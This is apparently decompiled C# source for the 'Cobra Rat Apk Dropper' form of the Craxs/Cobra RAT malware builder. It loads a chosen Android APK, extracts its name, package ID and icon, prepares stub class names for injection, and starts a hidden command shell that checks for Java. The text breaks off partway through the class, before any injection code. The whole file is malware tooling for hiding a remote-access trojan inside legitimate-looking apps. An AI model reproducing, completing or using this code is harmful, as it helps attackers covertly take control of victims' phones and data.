using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Craxs_Rat.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class Drooper : Form
{
	public delegate void addLogback(object[] objs);

	[CompilerGenerated]
	internal sealed class _Closure_0024__77_002D0
	{
		public string _0024VB_0024Local_appname;

		public string _0024VB_0024Local_PackageName;

		public Drooper _0024VB_0024Me;

		public _Closure_0024__77_002D0(_Closure_0024__77_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_appname = arg0._0024VB_0024Local_appname;
				_0024VB_0024Local_PackageName = arg0._0024VB_0024Local_PackageName;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			_0024VB_0024Me.labelname.Text = "الأسم:";
			_0024VB_0024Me.textappname.Text = _0024VB_0024Local_appname;
			_0024VB_0024Me.labelid.Text = "المعرف:";
			_0024VB_0024Me.textpkgname.Text = _0024VB_0024Local_PackageName;
		}

		[SpecialName]
		internal void _Lambda_0024__1()
		{
			_0024VB_0024Me.labelname.Text = "姓名:";
			_0024VB_0024Me.textappname.Text = _0024VB_0024Local_appname;
			_0024VB_0024Me.labelid.Text = "标识符:";
			_0024VB_0024Me.textpkgname.Text = _0024VB_0024Local_PackageName;
		}

		[SpecialName]
		internal void _Lambda_0024__2()
		{
			_0024VB_0024Me.labelname.Text = "App Name:";
			_0024VB_0024Me.textappname.Text = _0024VB_0024Local_appname;
			_0024VB_0024Me.labelid.Text = "App ID:";
			_0024VB_0024Me.textpkgname.Text = _0024VB_0024Local_PackageName;
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BackgroundWorker1")]
	private BackgroundWorker _BackgroundWorker1;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("selectapkbtn")]
	[CompilerGenerated]
	private Button _selectapkbtn;

	[AccessedThroughProperty("Button1")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Button _Button1;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Button2")]
	[CompilerGenerated]
	private Button _Button2;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("WorkWorker")]
	[CompilerGenerated]
	private BackgroundWorker _WorkWorker;

	[AccessedThroughProperty("Button3")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Button _Button3;

	private string TargetAPKPATH;

	private string TargetApkicon;

	private string originalapkname;

	private string APKINFO;

	private Process cmdProcess;

	private string WorkDIR;

	private string outputpath;

	private string buildapkpath;

	private string assetspath;

	private string ClassesPath;

	private string stringspath;

	private string stubicon;

	private string BASEPATH;

	private string STUBPATH;

	private string apktoolpath;

	private string Apksignerpath;

	private string ApkZIPpath;

	private string Apkeditorpath;

	private string C;

	private string K;

	private string MainfistPath;

	private string ClassGen1;

	private string ClassGen2;

	private string ClassGen3;

	private string ClassGen4;

	private string ClassGen5;

	private string N_Class1;

	private string N_Class2;

	private string N_Class3;

	private string N_Class4;

	private string N_Class5;

	private bool firsttry;

	private bool HoldExtract;

	private bool Waitbuild;

	private bool Waitprotect;

	private Random rshit;

	private int cou;

	private bool FoundJava;

	[field: AccessedThroughProperty("DrakeUISymbolLabel1")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TapkText")]
	internal virtual DrakeUITextBox TapkText
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual BackgroundWorker BackgroundWorker1
	{
		[CompilerGenerated]
		get
		{
			return _BackgroundWorker1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = BackgroundWorker1_DoWork;
			BackgroundWorker backgroundWorker = _BackgroundWorker1;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_BackgroundWorker1 = value;
			backgroundWorker = _BackgroundWorker1;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	[field: AccessedThroughProperty("apkicon")]
	internal virtual PictureBox apkicon
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button selectapkbtn
	{
		[CompilerGenerated]
		get
		{
			return _selectapkbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Selectapkbtn_Click;
			Button button = _selectapkbtn;
			if (button != null)
			{
				button.Click -= value2;
			}
			_selectapkbtn = value;
			button = _selectapkbtn;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("labelid")]
	internal virtual Label labelid
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("labelname")]
	internal virtual Label labelname
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("textpkgname")]
	internal virtual DrakeUITextBox textpkgname
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("textappname")]
	internal virtual DrakeUITextBox textappname
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Button1_Click;
			Button button = _Button1;
			if (button != null)
			{
				button.Click -= value2;
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button Button2
	{
		[CompilerGenerated]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Button2_Click;
			Button button = _Button2;
			if (button != null)
			{
				button.Click -= value2;
			}
			_Button2 = value;
			button = _Button2;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("logtext")]
	internal virtual RichTextBox logtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual BackgroundWorker WorkWorker
	{
		[CompilerGenerated]
		get
		{
			return _WorkWorker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = WorkWorker_DoWork;
			BackgroundWorker backgroundWorker = _WorkWorker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_WorkWorker = value;
			backgroundWorker = _WorkWorker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	internal virtual Button Button3
	{
		[CompilerGenerated]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Button3_Click;
			Button button = _Button3;
			if (button != null)
			{
				button.Click -= value2;
			}
			_Button3 = value;
			button = _Button3;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	public Drooper()
	{
		base.FormClosing += Drooper_FormClosing;
		base.Load += Drooper_Load;
		TargetAPKPATH = "";
		TargetApkicon = "";
		originalapkname = "";
		APKINFO = "";
		outputpath = "";
		buildapkpath = "";
		assetspath = "";
		ClassesPath = "";
		stringspath = "";
		stubicon = "";
		BASEPATH = "";
		STUBPATH = "";
		apktoolpath = "";
		Apksignerpath = "";
		ApkZIPpath = "";
		Apkeditorpath = "";
		C = "";
		K = "";
		MainfistPath = "";
		ClassGen1 = "BroReceiver";
		ClassGen2 = "ConfirmDialog";
		ClassGen3 = "MainActivity";
		ClassGen4 = "SecoundActivity";
		ClassGen5 = "SessionManager";
		N_Class1 = "";
		N_Class2 = "";
		N_Class3 = "";
		N_Class4 = "";
		N_Class5 = "";
		firsttry = false;
		HoldExtract = false;
		Waitbuild = true;
		Waitprotect = true;
		cou = 0;
		FoundJava = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.DrakeUISymbolLabel1 = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.selectapkbtn = new System.Windows.Forms.Button();
		this.TapkText = new DrakeUI.Framework.DrakeUITextBox();
		this.BackgroundWorker1 = new System.ComponentModel.BackgroundWorker();
		this.apkicon = new System.Windows.Forms.PictureBox();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.labelid = new System.Windows.Forms.Label();
		this.labelname = new System.Windows.Forms.Label();
		this.textpkgname = new DrakeUI.Framework.DrakeUITextBox();
		this.textappname = new DrakeUI.Framework.DrakeUITextBox();
		this.Button1 = new System.Windows.Forms.Button();
		this.Button2 = new System.Windows.Forms.Button();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.logtext = new System.Windows.Forms.RichTextBox();
		this.WorkWorker = new System.ComponentModel.BackgroundWorker();
		this.Button3 = new System.Windows.Forms.Button();
		this.Panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.apkicon).BeginInit();
		this.Panel2.SuspendLayout();
		this.Panel3.SuspendLayout();
		base.SuspendLayout();
		this.DrakeUISymbolLabel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeUISymbolLabel1.Font = new System.Drawing.Font("Calibri", 14f);
		this.DrakeUISymbolLabel1.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUISymbolLabel1.Location = new System.Drawing.Point(0, 0);
		this.DrakeUISymbolLabel1.Name = "DrakeUISymbolLabel1";
		this.DrakeUISymbolLabel1.Padding = new System.Windows.Forms.Padding(28, 0, 0, 0);
		this.DrakeUISymbolLabel1.Size = new System.Drawing.Size(519, 35);
		this.DrakeUISymbolLabel1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUISymbolLabel1.Symbol = 61465;
		this.DrakeUISymbolLabel1.SymbolColor = System.Drawing.Color.SkyBlue;
		this.DrakeUISymbolLabel1.TabIndex = 1;
		this.DrakeUISymbolLabel1.Text = "Cobra Rat Apk Dropper";
		this.Panel1.Controls.Add(this.selectapkbtn);
		this.Panel1.Controls.Add(this.TapkText);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel1.Location = new System.Drawing.Point(0, 35);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(519, 100);
		this.Panel1.TabIndex = 2;
		this.selectapkbtn.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.selectapkbtn.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.selectapkbtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.selectapkbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.selectapkbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.selectapkbtn.Location = new System.Drawing.Point(384, 34);
		this.selectapkbtn.Name = "selectapkbtn";
		this.selectapkbtn.Size = new System.Drawing.Size(121, 32);
		this.selectapkbtn.TabIndex = 47;
		this.selectapkbtn.Text = "Select Apk";
		this.selectapkbtn.UseVisualStyleBackColor = true;
		this.TapkText.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.TapkText.Enabled = false;
		this.TapkText.FillColor = System.Drawing.Color.Black;
		this.TapkText.FillDisableColor = System.Drawing.Color.Black;
		this.TapkText.Font = new System.Drawing.Font("Calibri", 12f);
		this.TapkText.ForeColor = System.Drawing.Color.SkyBlue;
		this.TapkText.ForeDisableColor = System.Drawing.Color.SkyBlue;
		this.TapkText.Location = new System.Drawing.Point(10, 34);
		this.TapkText.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.TapkText.Maximum = 2147483647.0;
		this.TapkText.Minimum = -2147483648.0;
		this.TapkText.Name = "TapkText";
		this.TapkText.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.TapkText.Radius = 10;
		this.TapkText.RectColor = System.Drawing.Color.SkyBlue;
		this.TapkText.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.TapkText.Size = new System.Drawing.Size(366, 32);
		this.TapkText.Style = DrakeUI.Framework.UIStyle.Custom;
		this.TapkText.StyleCustomMode = true;
		this.TapkText.TabIndex = 46;
		this.TapkText.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
		this.TapkText.Watermark = "Target Apk";
		this.apkicon.Dock = System.Windows.Forms.DockStyle.Left;
		this.apkicon.Location = new System.Drawing.Point(0, 0);
		this.apkicon.Name = "apkicon";
		this.apkicon.Size = new System.Drawing.Size(126, 98);
		this.apkicon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.apkicon.TabIndex = 3;
		this.apkicon.TabStop = false;
		this.Panel2.Controls.Add(this.labelid);
		this.Panel2.Controls.Add(this.labelname);
		this.Panel2.Controls.Add(this.textpkgname);
		this.Panel2.Controls.Add(this.textappname);
		this.Panel2.Controls.Add(this.apkicon);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel2.Location = new System.Drawing.Point(0, 135);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new System.Drawing.Size(519, 98);
		this.Panel2.TabIndex = 4;
		this.labelid.AutoSize = true;
		this.labelid.Font = new System.Drawing.Font("Calibri", 10f);
		this.labelid.ForeColor = System.Drawing.Color.SkyBlue;
		this.labelid.Location = new System.Drawing.Point(132, 53);
		this.labelid.Name = "labelid";
		this.labelid.Size = new System.Drawing.Size(56, 21);
		this.labelid.TabIndex = 50;
		this.labelid.Text = "App ID";
		this.labelname.AutoSize = true;
		this.labelname.Font = new System.Drawing.Font("Calibri", 10f);
		this.labelname.ForeColor = System.Drawing.Color.SkyBlue;
		this.labelname.Location = new System.Drawing.Point(132, 9);
		this.labelname.Name = "labelname";
		this.labelname.Size = new System.Drawing.Size(83, 21);
		this.labelname.TabIndex = 49;
		this.labelname.Text = "App Name";
		this.textpkgname.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.textpkgname.FillColor = System.Drawing.Color.Black;
		this.textpkgname.FillDisableColor = System.Drawing.Color.Black;
		this.textpkgname.Font = new System.Drawing.Font("Calibri", 12f);
		this.textpkgname.ForeColor = System.Drawing.Color.SkyBlue;
		this.textpkgname.ForeDisableColor = System.Drawing.Color.SkyBlue;
		this.textpkgname.Location = new System.Drawing.Point(251, 53);
		this.textpkgname.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.textpkgname.Maximum = 2147483647.0;
		this.textpkgname.Minimum = -2147483648.0;
		this.textpkgname.Name = "textpkgname";
		this.textpkgname.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.textpkgname.Radius = 10;
		this.textpkgname.RectColor = System.Drawing.Color.SkyBlue;
		this.textpkgname.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.textpkgname.Size = new System.Drawing.Size(254, 32);
		this.textpkgname.Style = DrakeUI.Framework.UIStyle.Custom;
		this.textpkgname.StyleCustomMode = true;
		this.textpkgname.TabIndex = 48;
		this.textpkgname.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
		this.textpkgname.Watermark = "package name";
		this.textappname.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.textappname.FillColor = System.Drawing.Color.Black;
		this.textappname.FillDisableColor = System.Drawing.Color.Black;
		this.textappname.Font = new System.Drawing.Font("Calibri", 12f);
		this.textappname.ForeColor = System.Drawing.Color.White;
		this.textappname.ForeDisableColor = System.Drawing.Color.SkyBlue;
		this.textappname.Location = new System.Drawing.Point(251, 9);
		this.textappname.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.textappname.Maximum = 2147483647.0;
		this.textappname.Minimum = -2147483648.0;
		this.textappname.Name = "textappname";
		this.textappname.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.textappname.Radius = 10;
		this.textappname.RectColor = System.Drawing.Color.SkyBlue;
		this.textappname.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.textappname.Size = new System.Drawing.Size(254, 32);
		this.textappname.Style = DrakeUI.Framework.UIStyle.Custom;
		this.textappname.StyleCustomMode = true;
		this.textappname.TabIndex = 47;
		this.textappname.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
		this.textappname.Watermark = "App Name";
		this.Button1.Dock = System.Windows.Forms.DockStyle.Left;
		this.Button1.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.Button1.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.Button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.Button1.Font = new System.Drawing.Font("Calibri", 12f);
		this.Button1.ForeColor = System.Drawing.Color.SkyBlue;
		this.Button1.Location = new System.Drawing.Point(0, 0);
		this.Button1.Name = "Button1";
		this.Button1.Size = new System.Drawing.Size(159, 63);
		this.Button1.TabIndex = 48;
		this.Button1.Text = "icon";
		this.Button1.UseVisualStyleBackColor = true;
		this.Button2.Dock = System.Windows.Forms.DockStyle.Right;
		this.Button2.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.Button2.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.Button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.Button2.Font = new System.Drawing.Font("Calibri", 12f);
		this.Button2.ForeColor = System.Drawing.Color.SkyBlue;
		this.Button2.Location = new System.Drawing.Point(360, 0);
		this.Button2.Name = "Button2";
		this.Button2.Size = new System.Drawing.Size(159, 63);
		this.Button2.TabIndex = 49;
		this.Button2.Text = "Create";
		this.Button2.UseVisualStyleBackColor = true;
		this.Panel3.Controls.Add(this.Button2);
		this.Panel3.Controls.Add(this.Button1);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel3.Location = new System.Drawing.Point(0, 233);
		this.Panel3.Name = "Panel3";
		this.Panel3.Size = new System.Drawing.Size(519, 63);
		this.Panel3.TabIndex = 50;
		this.logtext.BackColor = System.Drawing.Color.Black;
		this.logtext.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.logtext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.logtext.Font = new System.Drawing.Font("Calibri", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.logtext.ForeColor = System.Drawing.Color.Lime;
		this.logtext.Location = new System.Drawing.Point(0, 296);
		this.logtext.Name = "logtext";
		this.logtext.ReadOnly = true;
		this.logtext.Size = new System.Drawing.Size(519, 318);
		this.logtext.TabIndex = 51;
		this.logtext.Text = "";
		this.Button3.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Button3.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.Button3.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.Button3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.Button3.Font = new System.Drawing.Font("Calibri", 12f);
		this.Button3.ForeColor = System.Drawing.Color.SkyBlue;
		this.Button3.Location = new System.Drawing.Point(0, 614);
		this.Button3.Name = "Button3";
		this.Button3.Size = new System.Drawing.Size(519, 51);
		this.Button3.TabIndex = 52;
		this.Button3.Text = "About Cobra Rrooper?";
		this.Button3.UseVisualStyleBackColor = true;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.Black;
		base.ClientSize = new System.Drawing.Size(519, 665);
		base.Controls.Add(this.logtext);
		base.Controls.Add(this.Button3);
		base.Controls.Add(this.Panel3);
		base.Controls.Add(this.Panel2);
		base.Controls.Add(this.Panel1);
		base.Controls.Add(this.DrakeUISymbolLabel1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
		base.Name = "Cobra Rat Drooper By t.me/CobraRat";
		base.ShowIcon = false;
		this.Text = "Cobra Rat Drooper By t.me/CobraRat";
		this.Panel1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.apkicon).EndInit();
		this.Panel2.ResumeLayout(false);
		this.Panel2.PerformLayout();
		this.Panel3.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void Selectapkbtn_Click(object sender, EventArgs e)
	{
		if (BackgroundWorker1.IsBusy)
		{
			CraxsAlert.Showinformation("Please Wait.");
		}
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = "Selecte Android App [Only .apk] (.apk)";
		openFileDialog.Filter = "apk Files|*.apk";
		openFileDialog.RestoreDirectory = true;
		DialogResult dialogResult = openFileDialog.ShowDialog();
		if (dialogResult != DialogResult.OK)
		{
			TapkText.Text = "";
			return;
		}
		TapkText.Text = openFileDialog.FileName;
		TargetAPKPATH = openFileDialog.FileName;
		if (!BackgroundWorker1.IsBusy)
		{
			BackgroundWorker1.RunWorkerAsync();
		}
		originalapkname = Path.GetFileName(openFileDialog.FileName);
	}

	private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
	{
		if (string.IsNullOrEmpty(TargetAPKPATH))
		{
			return;
		}
		_Closure_0024__77_002D0 arg = default(_Closure_0024__77_002D0);
		_Closure_0024__77_002D0 CS_0024_003C_003E8__locals26 = new _Closure_0024__77_002D0(arg);
		CS_0024_003C_003E8__locals26._0024VB_0024Me = this;
		APKINFO = Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\aapt.exe"), "dump badging \"" + TargetAPKPATH + "\"");
		if (apkicon.Image != null)
		{
			apkicon.Image.Dispose();
			apkicon.Image = null;
		}
		CS_0024_003C_003E8__locals26._0024VB_0024Local_appname = Codes.ExtractName(TargetAPKPATH);
		CS_0024_003C_003E8__locals26._0024VB_0024Local_PackageName = Conversions.ToString(Codes.RegexMatcher("(?<=package: name=\\')(.*?)(?=\\')", APKINFO));
		Conversions.ToString(Codes.RegexMatcher("(?<=versionCode=\\')(.*?)(?=\\')", APKINFO));
		Conversions.ToString(Codes.RegexMatcher("(?<=versionName=\\')(.*?)(?=\\')", APKINFO));
		string sdkNumber = Conversions.ToString(Codes.RegexMatcher("(?<=sdkVersion:\\')(.*?)(?=\\')", APKINFO));
		Codes.GetAndroidVersionName(sdkNumber);
		string sdkNumber2 = Conversions.ToString(Codes.RegexMatcher("(?<=targetSdkVersion:\\')(.*?)(?=\\')", APKINFO));
		Codes.GetAndroidVersionName(sdkNumber2);
		if (string.IsNullOrEmpty(CS_0024_003C_003E8__locals26._0024VB_0024Local_appname))
		{
			MatchCollection matchCollection = Regex.Matches(APKINFO, "application-label:'([^']*)'");
			if (matchCollection.Count > 0)
			{
				foreach (Match item in matchCollection)
				{
					string value = item.Groups[1].Value;
					Console.WriteLine("Found application label: " + value);
					CS_0024_003C_003E8__locals26._0024VB_0024Local_appname = value;
				}
			}
			else
			{
				CS_0024_003C_003E8__locals26._0024VB_0024Local_appname = "Not found";
			}
		}
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					CS_0024_003C_003E8__locals26._0024VB_0024Me.labelname.Text = "App Name:";
					CS_0024_003C_003E8__locals26._0024VB_0024Me.textappname.Text = CS_0024_003C_003E8__locals26._0024VB_0024Local_appname;
					CS_0024_003C_003E8__locals26._0024VB_0024Me.labelid.Text = "App ID:";
					CS_0024_003C_003E8__locals26._0024VB_0024Me.textpkgname.Text = CS_0024_003C_003E8__locals26._0024VB_0024Local_PackageName;
				}));
			}
			else
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					CS_0024_003C_003E8__locals26._0024VB_0024Me.labelname.Text = "姓名:";
					CS_0024_003C_003E8__locals26._0024VB_0024Me.textappname.Text = CS_0024_003C_003E8__locals26._0024VB_0024Local_appname;
					CS_0024_003C_003E8__locals26._0024VB_0024Me.labelid.Text = "标识符:";
					CS_0024_003C_003E8__locals26._0024VB_0024Me.textpkgname.Text = CS_0024_003C_003E8__locals26._0024VB_0024Local_PackageName;
				}));
			}
		}
		else
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				CS_0024_003C_003E8__locals26._0024VB_0024Me.labelname.Text = "الأسم:";
				CS_0024_003C_003E8__locals26._0024VB_0024Me.textappname.Text = CS_0024_003C_003E8__locals26._0024VB_0024Local_appname;
				CS_0024_003C_003E8__locals26._0024VB_0024Me.labelid.Text = "المعرف:";
				CS_0024_003C_003E8__locals26._0024VB_0024Me.textpkgname.Text = CS_0024_003C_003E8__locals26._0024VB_0024Local_PackageName;
			}));
		}
		string text = Conversions.ToString(Codes.RegexMatcher("(?<=application-icon-160:\\')(.*?)(?=\\')", APKINFO));
		if (Operators.CompareString(Path.GetExtension(text), ".xml", TextCompare: false) == 0)
		{
			text = text.Replace(".xml", ".png");
		}
		string text2 = Codes.TempPathCache + CS_0024_003C_003E8__locals26._0024VB_0024Local_PackageName + "\\\\" + text;
		string directoryName = Path.GetDirectoryName(text2);
		if (text.Contains("anydpi-v26"))
		{
			string[] pngs = Codes.pngs;
			foreach (string newValue in pngs)
			{
				string text3 = text.Replace("mipmap-anydpi-v26", newValue).Replace("drawable-anydpi-v26", newValue);
				Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), "e \"" + TargetAPKPATH + "\" \"" + text3 + "\" -o\"" + directoryName + "\" -aoa");
			}
		}
		else
		{
			Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), "e \"" + TargetAPKPATH + "\" \"" + text + "\" -o\"" + directoryName + "\" -aoa");
		}
		Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), "e \"" + TargetAPKPATH + "\" \"META-INF\" -o\"" + Codes.TempPathCache + CS_0024_003C_003E8__locals26._0024VB_0024Local_PackageName + "\\META-INF\" -aoa");
		try
		{
			apkicon.Image = Image.FromFile(text2);
			TargetApkicon = text2;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			apkicon.Image = Resources.noicon;
			TargetApkicon = null;
			ProjectData.ClearProjectError();
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = "Selecte image icon [Only .PNG] (.png)";
		openFileDialog.Filter = "png Files|*.png";
		openFileDialog.RestoreDirectory = true;
		DialogResult dialogResult = openFileDialog.ShowDialog();
		if (dialogResult != DialogResult.OK)
		{
			TargetApkicon = null;
			return;
		}
		Bitmap image = new Bitmap(Image.FromFile(openFileDialog.FileName));
		apkicon.Image = image;
		TargetApkicon = openFileDialog.FileName;
	}

	public void LogBack(object[] objs)
	{
		if (base.InvokeRequired)
		{
			addLogback method = LogBack;
			Invoke(method, new object[1] { objs });
		}
		else
		{
			string text = Conversions.ToString(objs[0]);
			logtext.AppendText("> " + text + "\r\n");
			logtext.SelectionStart = Strings.Len(logtext.Text);
			logtext.ScrollToCaret();
			logtext.Select();
		}
	}

	public void log(string Str)
	{
		LogBack(new object[1] { Str });
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		if (WorkWorker != null && WorkWorker.IsBusy)
		{
			CraxsAlert.Showinformation("Drooper is working...");
			return;
		}
		if (string.IsNullOrEmpty(TargetAPKPATH))
		{
			CraxsAlert.Showinformation("Please select app first");
			return;
		}
		if (string.IsNullOrEmpty(TargetApkicon))
		{
			CraxsAlert.Showinformation("no icon is selected !!!");
			return;
		}
		if (string.IsNullOrEmpty(textpkgname.Text) | string.IsNullOrEmpty(textappname.Text))
		{
			CraxsAlert.Showinformation("App name and id is required");
			return;
		}
		WorkWorker.RunWorkerAsync();
		cmdProcess = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.RedirectStandardInput = true;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		cmdProcess.EnableRaisingEvents = true;
		cmdProcess.StartInfo = processStartInfo;
		cmdProcess.OutputDataReceived += cmdOutputHandler;
		cmdProcess.ErrorDataReceived += cmdOutputHandler;
		cmdProcess.Start();
		cmdProcess.BeginOutputReadLine();
		cmdProcess.BeginErrorReadLine();
		log("Check for java");
		ExecuteCommand("java -version");
	}

	private void S()
	{
		Thread.Sleep(1000);
	}

